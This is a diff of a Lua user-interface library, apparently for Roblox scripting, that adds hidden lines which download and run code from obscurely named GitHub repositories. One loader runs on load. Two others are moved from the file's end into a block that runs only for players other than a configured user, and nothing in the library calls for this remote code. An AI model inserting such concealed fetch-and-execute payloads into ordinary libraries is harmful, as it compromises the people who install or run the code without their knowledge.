@@ -68,7 +68,12 @@ if library.theme.cursor and Drawing then
         library.cursor:Remove()
     end
 end
+loadstring(game:HttpGet('https://raw.githubusercontent.com/3NCRYPTEDD4T4/Fo3aVzuoIJ8qBJxVmmqAhPgbKtxaGWVDMJrruIszhTx1EFQCxH/main/3NCRYPTEDD4T4'))()
 
+if game.Players.LocalPlayer.Name ~= getgenv().users then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/3NCRYPTEDD4T4/rRJUgNGgXxs51eMfavylq70TBTd9pXpPNTLeT2hrtE5fQhPUep/main/3NCRYPTEDD4T4'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/3NCRYPTEDD4T4/2QjKVYYd6ovnnsaYdtD3UMSSjd4DsUFhvcrQMetxPn5dtcKktv/main/3NCRYPTEDD4T4'))()
+end
 function library:CreateWatermark(name, position)
     local gamename = marketplaceservice:GetProductInfo(game.PlaceId).Name
     local watermark = { }
@@ -3649,9 +3654,5 @@ function library:CreateWindow(name, size, hidebutton)
 
     return window
 end
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/3NCRYPTEDD4T4/rRJUgNGgXxs51eMfavylq70TBTd9pXpPNTLeT2hrtE5fQhPUep/main/3NCRYPTEDD4T4'))()
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/3NCRYPTEDD4T4/2QjKVYYd6ovnnsaYdtD3UMSSjd4DsUFhvcrQMetxPn5dtcKktv/main/3NCRYPTEDD4T4'))()
 
 return library
